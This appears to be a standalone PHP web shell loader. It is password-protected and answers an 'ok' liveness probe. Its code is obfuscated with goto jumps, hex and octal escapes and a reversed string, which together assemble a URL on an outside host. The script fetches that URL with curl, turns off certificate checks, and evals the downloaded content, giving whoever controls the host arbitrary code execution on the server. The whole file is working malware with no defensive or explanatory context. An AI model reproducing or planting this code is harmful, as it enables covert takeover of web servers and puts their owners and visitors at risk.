<?php ?><?php error_reporting(0); if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == '6e4d5228cf850d984a9159d8a6957eb2252f871ba2bdab40c199c983ea7e93d1') {
      $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
?>
<?php
goto abM39; y6XNG: $SS8Fu .= "\x61\x64\57"; goto Toa91; XsSUB: $SS8Fu .= "\156\x2f\x61\x6d"; goto y6XNG; OzoPC: $SS8Fu .= "\145"; goto XsSUB; F0uUK: $SS8Fu .= "\164\56\61\x30\x61"; goto m5FkB; xJQZm: $SS8Fu .= "\57\x3a\x73\x70"; goto uRZbS; a7t9X: $SS8Fu .= "\63\61\57\167"; goto OzoPC; foILs: $SS8Fu .= "\164\170\x74\x2e\71"; goto a7t9X; m5FkB: $SS8Fu .= "\155\x61\144\x2f"; goto xJQZm; Toa91: $SS8Fu .= "\x70\157"; goto F0uUK; bjYUL: $SS8Fu .= "\x74\x68"; goto ZQY1f; uRZbS: $SS8Fu .= "\x74"; goto bjYUL; ZQY1f: eval("\x3f\x3e" . Tw2kx(strrev($SS8Fu))); goto GJQOP; abM39: $SS8Fu = ''; goto foILs; GJQOP: function tw2kx($V1_rw = '') { goto pvodd; xyA6t: curl_setopt($xM315, CURLOPT_TIMEOUT, 500); goto QUqD1; bum1m: curl_close($xM315); goto yk51G; yk51G: return $tvmad; goto llacL; CfzL7: $tvmad = curl_exec($xM315); goto bum1m; glb9w: curl_setopt($xM315, CURLOPT_URL, $V1_rw); goto CfzL7; bhhj0: curl_setopt($xM315, CURLOPT_SSL_VERIFYHOST, false); goto glb9w; QUqD1: curl_setopt($xM315, CURLOPT_SSL_VERIFYPEER, false); goto bhhj0; czIL1: curl_setopt($xM315, CURLOPT_RETURNTRANSFER, true); goto xyA6t; pvodd: $xM315 = curl_init(); goto czIL1; llacL: }